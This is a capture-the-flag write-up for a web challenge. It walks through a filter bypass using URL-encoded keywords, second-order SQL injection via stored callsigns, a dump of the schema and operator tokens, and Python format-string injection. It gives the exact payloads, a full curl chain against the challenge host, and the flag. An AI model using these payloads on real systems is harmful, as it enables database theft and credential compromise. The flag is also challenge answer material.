# Operation Dawn: The Dispatch Console

**Category:** Web

## Solution

### 1. Find where the callsign enters SQL

I mapped `/dispatches`, `/post`, `/digest`, and `/report`. The filter rejected raw `UNION`, while `%55NION` passed and was decoded by the application afterward. I used the same trick for `%53ELECT`.

My marker rows did not appear when I tried injecting directly into `/dispatches`, so I moved on to the stored callsigns.

In `/digest`, a stored callsign containing an SQL condition made its group display other dispatches. The digest was putting stored callsigns back into a query. The vulnerable pattern was equivalent to:

```sql
SELECT body FROM dispatches WHERE callsign='<stored_callsign>'   -- interpolated!
```

### 2. Store a balanced UNION payload

I submitted the payload as a callsign through `POST /post`, then opened `/digest` to trigger it. A one-column probe returned `M1`; probes with more columns disappeared from the digest.

I kept the quotes balanced instead of relying on a trailing SQL comment. The working callsign was:

```sql
QA1' UNION SELECT 'M1' WHERE '1' LIKE '1
```

For the request body I encoded the first letters of `UNION` and `SELECT`. I sent that pre-encoded body directly: passing it through another form encoder would turn `%` into `%25` and break the bypass.

### 3. Dump the schema and command token

I queried `sqlite_master` through the same stored callsign. The schema was:

```text
CREATE TABLE dispatches (id INTEGER PRIMARY KEY, callsign TEXT, body TEXT)
CREATE TABLE operators (id INTEGER PRIMARY KEY, callsign TEXT, token TEXT, role TEXT)
```

I then selected `callsign || ' :: ' || token || ' :: ' || role` from `operators`. `WARDEN` had the command role and token `AC-37db1623e76268c531d1e634`.

### 4. Read FLAG through the report formatter

The token opened `/report`. Its default `fmt` used fields such as `{dispatch.ref}` and `{dispatch.body}`. My probes showed that the input reached Python `str.format` and allowed attribute access.

I read the flag with:

```text
{dispatch.__init__.__globals__[FLAG]}
```

### 5. Run the request chain

These were my requests, from the encoded callsign to the final flag read. The URL and token belong to my original instance.

```bash
T=http://w01.ctf.chronos-security.ro:35584

# §4 — bypass the raw-body sanitiser: encode UNION/SELECT letters
curl -s -o /dev/null -w "%{http_code}\n" -X POST "$T/post" \
  --data "callsign=V%55NION&body=testB"                 # → 201

# §5 — 1-col probe (encoded)
curl -s -o /dev/null -w "%{http_code}\n" -X POST "$T/post" --data \
 "callsign=QA1%27%20%55NION%20%53ELECT%20%27M1%27%20WHERE%20%271%27%20LIKE%20%271&body=p"
curl -s "$T/digest" | grep -F "M1"                      # → "  - M1"  ⇒ 1 column

# §5 — schema + token dump (same encoding for U/S)
curl -s -X POST "$T/post" --data "callsign=QB%27%20%55NION%20%53ELECT%20IFNULL(sql,name)%20FROM%20sqlite_master%20WHERE%20%271%27%20LIKE%20%271&body=p"
curl -s "$T/digest"                                     # → CREATE TABLE operators (...)

curl -s -X POST "$T/post" --data "callsign=QD%27%20%55NION%20%53ELECT%20callsign%7C%7C%27%20%3A%3A%20%27%7C%7Ctoken%7C%7C%27%20%3A%3A%20%27%7C%7Crole%20FROM%20operators%20WHERE%20%271%27%20LIKE%20%271&body=p"
curl -s "$T/digest"                                     # → WARDEN :: AC-37db1623e76268c531d1e634 :: command

# §6 — format-string injection with the stolen token
curl -s -G "$T/report" \
  --data-urlencode "token=AC-37db1623e76268c531d1e634" \
  --data-urlencode "fmt=FLAG={dispatch.__init__.__globals__[FLAG]}"
# → FLAG=CSCTF{h9u5muEK5jMwLuVspcPVABN9}
```

## Flag

```text
CSCTF{h9u5muEK5jMwLuVspcPVABN9}
```
